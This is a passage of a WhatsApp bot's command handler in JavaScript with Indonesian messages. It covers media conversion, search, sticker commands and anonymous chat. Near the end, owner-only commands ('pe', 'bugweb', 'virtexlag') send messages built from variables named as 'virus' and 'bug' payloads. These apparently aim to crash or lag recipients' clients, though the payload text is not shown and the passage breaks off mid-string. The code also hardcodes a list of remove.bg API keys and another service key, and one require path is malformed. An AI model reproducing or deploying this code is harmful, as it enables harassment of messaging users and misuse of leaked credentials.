                let media = await ranz.downloadAndSaveMediaMessage(quoted)
                let ran = await getRandom('.png')
                exec(`ffmpeg -i ${media} ${ran}`, (err) => {
                    fs.unlinkSync(media)
                    if (err) throw err
                    let buffer = fs.readFileSync(ran)
                    ranz.sendMessage(m.chat, { image: buffer }, { quoted: m })
                    fs.unlinkSync(ran)
                })
            }
            break
case 'attp': case 'ttp': {
 if (!text) throw `Example : ${prefix + command} text`
 await ranz.sendMedia(m.chat, `https://xteam.xyz/${command}?file&text=${text}`, 'haikal', 'morou', m, {asSticker: true})
 }
 break
//=================================================//
	        case 'tomp4': case 'tovideo': {
                if (!quoted) throw 'Reply Image'
                if (!/webp/.test(mime)) throw `balas stiker dengan caption *${prefix + command}*`
                m.reply(mess.wait)
		let { webp2mp4File } = require('./lib/uploader')
                let media = await ranz.downloadAndSaveMediaMessage(quoted)
                let webpToMp4 = await webp2mp4File(media)
                await ranz.sendMessage(m.chat, { video: { url: webpToMp4.result, caption: 'Convert Webp To Video' } }, { quoted: m })
                await fs.unlinkSync(media)
            }
            break
            case 'toaud': case 'toaudio': {
            if (!/video/.test(mime) && !/audio/.test(mime)) throw `Kirim/Reply Video/Audio Yang Ingin Dijadikan Audio Dengan Caption ${prefix + command}`
            if (!quoted) throw `Kirim/Reply Video/Audio Yang Ingin Dijadikan Audio Dengan Caption ${prefix + command}`
            m.reply(mess.wait)
            let media = await quoted.download()
            let { toAudio } = require('./lib/converter')
            let audio = await toAudio(media, 'mp4')
            ranz.sendMessage(m.chat, {audio: audio, mimetype: 'audio/mpeg'}, { quoted : m })
            }
            break
            case 'tomp3': {
            if (/document/.test(mime)) throw `Kirim/Reply Video/Audio Yang Ingin Dijadikan MP3 Dengan Caption ${prefix + command}`
            if (!/video/.test(mime) && !/audio/.test(mime)) throw `Kirim/Reply Video/Audio Yang Ingin Dijadikan MP3 Dengan Caption ${prefix + command}`
            if (!quoted) throw `Kirim/Reply Video/Audio Yang Ingin Dijadikan MP3 Dengan Caption ${prefix + command}`
            m.reply(mess.wait)
            let media = await quoted.download()
            let { toAudio } = require('./lib/converter')
            let audio = await toAudio(media, 'mp4')
            ranz.sendMessage(m.chat, {document: audio, mimetype: 'audio/mpeg', fileName: `Convert By ${ranz.user.name}.mp3`}, { quoted : m })
            }
            break
            case 'tovn': case 'toptt': {
            if (!/video/.test(mime) && !/audio/.test(mime)) throw `Reply Video/Audio Yang Ingin Dijadikan VN Dengan Caption ${prefix + command}`
            if (!quoted) throw `Reply Video/Audio Yang Ingin Dijadikan VN Dengan Caption ${prefix + command}`
            m.reply(mess.wait)
            let media = await quoted.download()
            let { toPTT } = require('./lib/converter')
            let audio = await toPTT(media, 'mp4')
            ranz.sendMessage(m.chat, {audio: audio, mimetype:'audio/mpeg', ptt:true }, {quoted:m})
            }
            break
            case 'togif': {
                if (!quoted) throw 'Reply Image'
                if (!/webp/.test(mime)) throw `balas stiker dengan caption *${prefix + command}*`
                m.reply(mess.wait)
		let { webp2mp4File } = require('./lib/uploader')
                let media = await ranz.downloadAndSaveMediaMessage(quoted)
                let webpToMp4 = await webp2mp4File(media)
                await ranz.sendMessage(m.chat, { video: { url: webpToMp4.result, caption: 'Convert Webp To Video' }, gifPlayback: true }, { quoted: m })
                await fs.unlinkSync(media)
            }
            break
	        case 'tourl': {
                m.reply(mess.wait)
		let { UploadFileUgu, webp2mp4File, TelegraPh } = require('./lib/uploader')
                let media = await ranz.downloadAndSaveMediaMessage(quoted)
                if (/image/.test(mime)) {
                    let anu = await TelegraPh(media)
                    m.reply(util.format(anu))
                } else if (!/image/.test(mime)) {
                    let anu = await UploadFileUgu(media)
                    m.reply(util.format(anu))
                }
                await fs.unlinkSync(media)
            }
            break
            case 'imagenobg': case 'removebg': case 'remove-bg': {
	    if (!quoted) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
	    if (!/image/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
	    if (/webp/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
	    let remobg = require('remove.bg')
	    let apirnobg = ['q61faXzzR5zNU6cvcrwtUkRU','S258diZhcuFJooAtHTaPEn4T','5LjfCVAp4vVNYiTjq9mXJWHF','aT7ibfUsGSwFyjaPZ9eoJc61','BY63t7Vx2tS68YZFY6AJ4HHF','5Gdq1sSWSeyZzPMHqz7ENfi8','86h6d6u4AXrst4BVMD9dzdGZ','xp8pSDavAgfE5XScqXo9UKHF','dWbCoCb3TacCP93imNEcPxcL']
	    let apinobg = apirnobg[Math.floor(Math.random() * apirnobg.length)]
	    hmm = await './src/remobg-'+getRandom('')
	    localFile = await ranz.downloadAndSaveMediaMessage(quoted, hmm)
	    outputFile = await './src/hremo-'+getRandom('.png')
	    m.reply(mess.wait)
	    remobg.removeBackgroundFromImageFile({
	      path: localFile,
	      apiKey: apinobg,
	      size: "regular",
	      type: "auto",
	      scale: "100%",
	      outputFile 
	    }).then(async result => {
	    ranz.sendMessage(m.chat, {image: fs.readFileSync(outputFile), caption: mess.success}, { quoted : m })
	    await fs.unlinkSync(localFile)
	    await fs.unlinkSync(outputFile)
	    })
	    }
	    break
	    case 'yts': case 'ytsearch': {
                if (!text) throw `Example : ${prefix + command} story wa anime`
                let yts = require("yt-search")
                let search = await yts(text)
                let teks = 'YouTube Search\n\n Result From '+text+'\n\n'
                let no = 1
                for (let i of search.all) {
                    teks += `⭔ No : ${no++}\n⭔ Type : ${i.type}\n⭔ Video ID : ${i.videoId}\n⭔ Title : ${i.title}\n⭔ Views : ${i.views}\n⭔ Duration : ${i.timestamp}\n⭔ Upload At : ${i.ago}\n⭔ Author : ${i.author.name}\n⭔ Url : ${i.url}\n\n─────────────────\n\n`
                }
                ranz.sendMessage(m.chat, { image: { url: search.all[0].thumbnail },  caption: teks }, { quoted: m })
            }
            break
        case 'google': {
                if (!text) throw `Example : ${prefix + command} fatih arridho`
                let google = require('google-it')
                google({'query': text}).then(res => {
                let teks = `Google Search From : ${text}\n\n`
                for (let g of res) {
                teks += `⭔ *Title* : ${g.title}\n`
                teks += `⭔ *Description* : ${g.snippet}\n`
                teks += `⭔ *Link* : ${g.link}\n\n────────────────────────\n\n`
                } 
                m.reply(teks)
                })
                }
                break
        case 'gimage': {
        if (!text) throw `Example : ${prefix + command} kaori cicak`
        let gis = require('g-i-s')
        gis(text, async (error, result) => {
        n = result
        images = n[Math.floor(Math.random() * n.length)].url
        let buttons = [
                    {buttonId: `gimage ${text}`, buttonText: {displayText: 'Next Image'}, type: 1}
                ]
                let buttonMessage = {
                    image: { url: images },
                    caption: `*-------「 GIMAGE SEARCH 」-------*
🤠 *Query* : ${text}
🔗 *Media Url* : ${images}`,
                    footer: ranz.user.name,
                    buttons: buttons,
                    headerType: 4
                }
                ranz.sendMessage(m.chat, buttonMessage, { quoted: m })
        })
        }
        break
	    case 'play': case 'ytplay': {
                if (!text) throw `Example : ${prefix + command} story wa anime`
                let yts = require("yt-search")
                let search = await yts(text)
                let anu = search.videos[Math.floor(Math.random() * search.videos.length)]
                let buttons = [
                    {buttonId: `ytmp3 ${anu.url}`, buttonText: {displayText: 'A U D I O'}, type: 1},
                    {buttonId: `ytmp4 ${anu.url}`, buttonText: {displayText: 'V I D E O'}, type: 1}
                ]
                let buttonMessage = {
                    image: { url: anu.thumbnail },
                    caption: `
⭔ Title : ${anu.title}
⭔ Ext : Search
⭔ ID : ${anu.videoId}
⭔ Duration : ${anu.timestamp}
⭔ Viewers : ${anu.views}
⭔ Upload At : ${anu.ago}
⭔ Author : ${anu.author.name}
⭔ Channel : ${anu.author.url}
⭔ Description : ${anu.description}
⭔ Url : ${anu.url}`,
                    footer: ranz.user.name,
                    buttons: buttons,
                    headerType: 4
                }
                ranz.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            break
	    case 'ytmp3': case 'ytaudio': {
                let { yta } = require('./lib/y2mate')
                if (!text) throw `Example : ${prefix + command} https://youtube.com/watch?v=PtFMh6Tccag%27 128kbps`
                let quality = args[1] ? args[1] : '128kbps'
                let media = await yta(text, quality)
                if (media.filesize >= 100000) return m.reply('File Melebihi Batas '+util.format(media))
                ranz.sendImage(m.chat, media.thumb, `⭔ Title : ${media.title}\n⭔ File Size : ${media.filesizeF}\n⭔ Url : ${isUrl(text)}\n⭔ Ext : MP3\n⭔ Resolusi : ${args[1] || '128kbps'}`, m)
                ranz.sendMessage(m.chat, { audio: { url: media.dl_link }, mimetype: 'audio/mpeg', fileName: `${media.title}.mp3` }, { quoted: m })
            }
            break
            case 'ytmp4': case 'ytvideo': {
                let { ytv } = require('./lib/y2mate')
                if (!text) throw `Example : ${prefix + command} https://youtube.com/watch?v=PtFMh6Tccag%27 360p`
                let quality = args[1] ? args[1] : '360p'
                let media = await ytv(text, quality)
                if (media.filesize >= 100000) return m.reply('File Melebihi Batas '+util.format(media))
                ranz.sendMessage(m.chat, { video: { url: media.dl_link }, mimetype: 'video/mp4', fileName: `${media.title}.mp4`, caption: `⭔ Title : ${media.title}\n⭔ File Size : ${media.filesizeF}\n⭔ Url : ${isUrl(text)}\n⭔ Ext : MP3\n⭔ Resolusi : ${args[1] || '360p'}` }, { quoted: m })
            }
 
            break
             case 'spotifydl': {
                if (!text) throw 'No Query Title'
                m.reply(mess.wait)
                let anu = await fetchJson(`https://server-kanza.herokuapp.com/api/spotifydl?url=${text}&apikey=VeanChan`)               
                let msg = await ranz.sendImage(m.chat, anu.result.thumbnail, `⭔ Title : ${anu.result.title}\n⭔ Artis : ${anu.result.artists}\n⭔ Popularity : ${anu.result.popularity}\n⭔ Durasi : ${anu.result.duration}\n⭔ Preview : ${anu.result.preview_url }`)
                ranz.sendMessage(m.chat, { audio: { url: anu.result.result }, mimetype: 'audio/mpeg', fileName: anu.result.title+'.m4a' }, { quoted: msg })
            }
            break     
            case 'umma': case 'ummadl': {
	        if (!text) throw `Example : ${prefix + command} https://umma.id/channel/video/post/gus-arafat-sumber-kecewa-84464612933698`
                let { umma } = require('./lib) scraper')
		let anu = await umma(isUrl(text)[0])
		if (anu.type == 'video') {
		    let buttons = [
                        {buttonId: `ytmp3 ${anu.media[0]} 128kbps`, buttonText: {displayText: '♫ Audio'}, type: 1},
                        {buttonId: `ytmp4 ${anu.media[0]} 360p`, buttonText: {displayText: '► Video'}, type: 1}
                    ]
		    let buttonMessage = {
		        image: { url: anu.author.profilePic },
			caption: `
⭔ Title : ${anu.title}
⭔ Author : ${anu.author.name}
⭔ Like : ${anu.like}
⭔ Caption : ${anu.caption}
⭔ Url : ${anu.media[0]}
Untuk Download Media Silahkan Klik salah satu Button dibawah ini atau masukkan command ytmp3/ytmp4 dengan url diatas
`,
			footer: ranz.user.name,
			buttons,
			headerType: 4
		    }
		    ranz.sendMessage(m.chat, buttonMessage, { quoted: m })
		} else if (anu.type == 'image') {
		    anu.media.map(async (url) => {
		        ranz.sendMessage(m.chat, { image: { url }, caption: `⭔ Title : ${anu.title}\n⭔ Author : ${anu.author.name}\n⭔ Like : ${anu.like}\n⭔ Caption : ${anu.caption}` }, { quoted: m })
		    })
		}
	    }
	    break
        case 'ringtone': {
		if (!text) throw `Example : ${prefix + command} black rover`
        let { ringtone } = require('./lib/scraper')
		let anu = await ringtone(text)
		let result = anu[Math.floor(Math.random() * anu.length)]
		ranz.sendMessage(m.chat, { audio: { url: result.audio }, fileName: result.title+'.mp3', mimetype: 'audio/mpeg' }, { quoted: m })
	    }
	    break
            case 'setcmd': {
                if (!m.quoted) throw 'Reply Pesan!'
                if (!m.quoted.fileSha256) throw 'SHA256 Hash Missing'
                if (!text) throw `Untuk Command Apa?`
                let hash = m.quoted.fileSha256.toString('base64')
                if (global.db.data.sticker[hash] && global.db.data.sticker[hash].locked) throw 'You have no permission to change this sticker command'
                global.db.data.sticker[hash] = {
                    text,
                    mentionedJid: m.mentionedJid,
                    creator: m.sender,
                    at: + new Date,
                    locked: false,
                }
                m.reply(`Done!`)
            }
            break
            case 'delcmd': {
                let hash = m.quoted.fileSha256.toString('base64')
                if (!hash) throw `Tidak ada hash`
                if (global.db.data.sticker[hash] && global.db.data.sticker[hash].locked) throw 'You have no permission to delete this sticker command'              
                delete global.db.data.sticker[hash]
                m.reply(`Done!`)
            }
            break
            case 'listcmd': {
                let teks = `
*List Hash*
Info: *bold* hash is Locked
${Object.entries(global.db.data.sticker).map(([key, value], index) => `${index + 1}. ${value.locked ? `*${key}*` : key} : ${value.text}`).join('\n')}
`.trim()
                ranz.sendText(m.chat, teks, m, { mentions: Object.values(global.db.data.sticker).map(x => x.mentionedJid).reduce((a,b) => [...a, ...b], []) })
            }
            break
            case 'lockcmd': {
                if (!isCreator) throw mess.owner
                if (!m.quoted) throw 'Reply Pesan!'
                if (!m.quoted.fileSha256) throw 'SHA256 Hash Missing'
                let hash = m.quoted.fileSha256.toString('base64')
                if (!(hash in global.db.data.sticker)) throw 'Hash not found in database'
                global.db.data.sticker[hash].locked = !/^un/i.test(command)
                m.reply('Done!')
            }
            break
            case 'addmsg': {
                if (!m.quoted) throw 'Reply Message Yang Ingin Disave Di Database'
                if (!text) throw `Example : ${prefix + command} nama file`
                let msgs = global.db.data.database
                if (text.toLowerCase() in msgs) throw `'${text}' telah terdaftar di list pesan`
                msgs[text.toLowerCase()] = quoted.fakeObj
m.reply(`Berhasil menambahkan pesan di list pesan sebagai '${text}'
    
Akses dengan ${prefix}getmsg ${text}

Lihat list Pesan Dengan ${prefix}listmsg`)
            }
            break
            case 'getmsg': {
                if (!text) throw `Example : ${prefix + command} file name\n\nLihat list pesan dengan ${prefix}listmsg`
                let msgs = global.db.data.database
                if (!(text.toLowerCase() in msgs)) throw `'${text}' tidak terdaftar di list pesan`
                ranz.copyNForward(m.chat, msgs[text.toLowerCase()], true)
            }
            break
            case 'listmsg': {
                let msgs = JSON.parse(fs.readFileSync('./src/database.json'))
	        let seplit = Object.entries(global.db.data.database).map(([nama, isi]) => { return { nama, ...isi } })
		let teks = '「 LIST DATABASE 」\n\n'
		for (let i of seplit) {
		    teks += `⬡ *Name :* ${i.nama}\n⬡ *Type :* ${getContentType(i.message).replace(/Message/i, '')}\n────────────────────────\n\n`
	        }
	        m.reply(teks)
	    }
	    break
            case 'delmsg': case 'deletemsg': {
	        let msgs = global.db.data.database
	        if (!(text.toLowerCase() in msgs)) return m.reply(`'${text}' tidak terdaftar didalam list pesan`)
		delete msgs[text.toLowerCase()]
		m.reply(`Berhasil menghapus '${text}' dari list pesan`)
            }
	    break
	    case 'anonymous': {
                if (m.isGroup) return m.reply('Fitur Tidak Dapat Digunakan Untuk Group!')
				this.anonymous = this.anonymous ? this.anonymous : {}
				let buttons = [
                    { buttonId: 'start', buttonText: { displayText: 'Start' }, type: 1 }
                ]
                ranz.sendButtonText(m.chat, buttons, `\`\`\`Hi ${await ranz.getName(m.sender)} Welcome To Anonymous Chat\n\nKlik Button Dibawah Ini Untuk Mencari Partner\`\`\``, ranz.user.name, m)
            }
			break
            case 'keluar': case 'leave': {
                if (m.isGroup) return m.reply('Fitur Tidak Dapat Digunakan Untuk Group!')
                this.anonymous = this.anonymous ? this.anonymous : {}
                let room = Object.values(this.anonymous).find(room => room.check(m.sender))
                if (!room) {
                    let buttons = [
                        { buttonId: 'start', buttonText: { displayText: 'Start' }, type: 1 }
                    ]
                    await ranz.sendButtonText(m.chat, buttons, `\`\`\`Kamu Sedang Tidak Berada Di Sesi Anonymous, Tekan Button Untuk Mencari Partner \`\`\``)
                    throw false
                }
                m.reply('Ok')
                let other = room.other(m.sender)
                if (other) await ranz.sendText(other, `\`\`\`Partner Telah Meninggalkan Sesi Anonymous\`\`\``, m)
                delete this.anonymous[room.id]
                if (command === 'leave') break
            }
            case 'mulai': case 'start': {
                if (m.isGroup) return m.reply('Fitur Tidak Dapat Digunakan Untuk Group!')
                this.anonymous = this.anonymous ? this.anonymous : {}
                if (Object.values(this.anonymous).find(room => room.check(m.sender))) {
                    let buttons = [
                        { buttonId: 'keluar', buttonText: { displayText: 'Stop' }, type: 1 }
                    ]
                    await ranz.sendButtonText(m.chat, buttons, `\`\`\`Kamu Masih Berada Di dalam Sesi Anonymous, Tekan Button Dibawah Ini Untuk Menghentikan Sesi Anonymous Anda\`\`\``, ranz.user.name, m)
                    throw false
                }
                let room = Object.values(this.anonymous).find(room => room.state === 'WAITING' && !room.check(m.sender))
                if (room) {
                    let buttons = [
                        { buttonId: 'next', buttonText: { displayText: 'Skip' }, type: 1 },
                        { buttonId: 'keluar', buttonText: { displayText: 'Stop' }, type: 1 }
                    ]
                    await ranz.sendButtonText(room.a, buttons, `\`\`\`Berhasil Menemukan Partner, sekarang kamu dapat mengirim pesan\`\`\``, ranz.user.name, m)
                    room.b = m.sender
                    room.state = 'CHATTING'
                    await ranz.sendButtonText(room.b, buttons, `\`\`\`Berhasil Menemukan Partner, sekarang kamu dapat mengirim pesan\`\`\``, ranz.user.name, m)
                } else {
                    let id = + new Date
                    this.anonymous[id] = {
                        id,
                        a: m.sender,
                        b: '',
                        state: 'WAITING',
                        check: function (who = '') {
                            return [this.a, this.b].includes(who)
                        },
                        other: function (who = '') {
                            return who === this.a ? this.b : who === this.b ? this.a : ''
                        },
                    }
                    let buttons = [
                        { buttonId: 'keluar', buttonText: { displayText: 'Stop' }, type: 1 }
                    ]
                    await ranz.sendButtonText(m.chat, buttons, `\`\`\`Mohon Tunggu Sedang Mencari Partner\`\`\``, ranz.user.name, m)
                }
                break
            }
            case 'next': case 'lanjut': {
                if (m.isGroup) return m.reply('Fitur Tidak Dapat Digunakan Untuk Group!')
                this.anonymous = this.anonymous ? this.anonymous : {}
                let romeo = Object.values(this.anonymous).find(room => room.check(m.sender))
                if (!romeo) {
                    let buttons = [
                        { buttonId: 'start', buttonText: { displayText: 'Start' }, type: 1 }
                    ]
                    await ranz.sendButtonText(m.chat, buttons, `\`\`\`Kamu Sedang Tidak Berada Di Sesi Anonymous, Tekan Button Untuk Mencari Partner\`\`\``)
                    throw false
                }
                let other = romeo.other(m.sender)
                if (other) await ranz.sendText(other, `\`\`\`Partner Telah Meninggalkan Sesi Anonymous\`\`\``, m)
                delete this.anonymous[romeo.id]
                let room = Object.values(this.anonymous).find(room => room.state === 'WAITING' && !room.check(m.sender))
                if (room) {
                    let buttons = [
                        { buttonId: 'next', buttonText: { displayText: 'Skip' }, type: 1 },
                        { buttonId: 'keluar', buttonText: { displayText: 'Stop' }, type: 1 }
                    ]
                    await ranz.sendButtonText(room.a, buttons, `\`\`\`Berhasil Menemukan Partner, sekarang kamu dapat mengirim pesan\`\`\``, ranz.user.name, m)
                    room.b = m.sender
                    room.state = 'CHATTING'
                    await ranz.sendButtonText(room.b, buttons, `\`\`\`Berhasil Menemukan Partner, sekarang kamu dapat mengirim pesan\`\`\``, ranz.user.name, m)
                } else {
                    let id = + new Date
                    this.anonymous[id] = {
                        id,
                        a: m.sender,
                        b: '',
                        state: 'WAITING',
                        check: function (who = '') {
                            return [this.a, this.b].includes(who)
                        },
                        other: function (who = '') {
                            return who === this.a ? this.b : who === this.b ? this.a : ''
                        },
                    }
                    let buttons = [
                        { buttonId: 'keluar', buttonText: { displayText: 'Stop' }, type: 1 }
                    ]
                    await ranz.sendButtonText(m.chat, buttons, `\`\`\`Mohon Tunggu Sedang Mencari Partner\`\`\``, ranz.user.name, m)
                }
                break
            }
            case 'public': {
                if (!isCreator) throw mess.owner
                ranz.public = true
                m.reply('Sukse Change To Public Usage')
            }
            break
            case 'self': {
                if (!isCreator) throw mess.owner
                ranz.public = false
                m.reply('Sukses Change To Self Usage')
            }
            break
            case 'ping': case 'botstatus': case 'statusbot': {
                const used = process.memoryUsage()
                const cpus = os.cpus().map(cpu => {
                    cpu.total = Object.keys(cpu.times).reduce((last, type) => last + cpu.times[type], 0)
			        return cpu
                })
                const cpu = cpus.reduce((last, cpu, _, { length }) => {
                    last.total += cpu.total
                    last.speed += cpu.speed / length
                    last.times.user += cpu.times.user
                    last.times.nice += cpu.times.nice
                    last.times.sys += cpu.times.sys
                    last.times.idle += cpu.times.idle
                    last.times.irq += cpu.times.irq
                    return last
                }, {
                    speed: 0,
                    total: 0,
                    times: {
			            user: 0,
			            nice: 0,
			            sys: 0,
			            idle: 0,
			            irq: 0
                }
                })
                let timestamp = speed()
                let latensi = speed() - timestamp
                neww = performance.now()
                oldd = performance.now()
                respon = `
Kecepatan Respon ${latensi.toFixed(4)} _Second_ \n ${oldd - neww} _miliseconds_\n\nRuntime : ${runtime(process.uptime())}

💻 Info Server
RAM: ${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}

_NodeJS Memory Usaage_
${Object.keys(used).map((key, _, arr) => `${key.padEnd(Math.max(...arr.map(v=>v.length)),' ')}: ${formatp(used[key])}`).join('\n')}

${cpus[0] ? `_Total CPU Usage_
${cpus[0].model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}
_CPU Core(s) Usage (${cpus.length} Core CPU)_
${cpus.map((cpu, i) => `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}`).join('\n\n')}` : ''}
                `.trim()
                m.reply(respon)
            }
            break
//=================================================//
            case 'speedtest': {
            m.reply('Testing Speed...')
            let cp = require('child_process')
            let { promisify } = require('util')
            let exec = promisify(cp.exec).bind(cp)
          let o
          try {
          o = await exec('python speed.py')
          } catch (e) {
          o = e
         } finally {
        let { stdout, stderr } = o
        if (stdout.trim()) m.reply(stdout)
        if (stderr.trim()) m.reply(stderr)
            }
            }
            break
//=================================================//
            case 'pe':
              if (!isCreator) throw mess.owner
              const buttons = [
  {buttonId: `${prefix}djisdjiwdjjes`, buttonText: {displayText: buttonvirus}, type: 1},
  {buttonId: 'babaabbabababa', buttonText: {displayText: ranzmods}, type: 1},
  {buttonId: 'babababbababa', buttonText: {displayText: virusv1}, type: 1}
]

const buttonMessage = {
    text: "Pe aja",
    footerText: 'Pe',
    buttons: buttons,
    headerType: 1
}
ranz.sendMessage(m.chat, buttonMessage)
               break
//=================================================//
 case 'bugweb':
if (!isCreator) throw mess.owner
kontolu = '© ISAL MODS WA',
ranz.sendMessage(m.chat, {text: kontolu, thumbnail: thumb, quoted: m, contextInfo: { externalAdReply:{title: `${bugweb}`,body: 'BY ISAL MODS',previewType:"PHOTO",thumbnail: thumb,sourceUrl:`https://xnxx.com`}}})
break
//=================================================//
case 'virtexlag':
if (!isCreator) throw mess.owner
kontolu = '© ISAL MODS WA                                                                                                                                                                                                                                                                                                                                                                                                        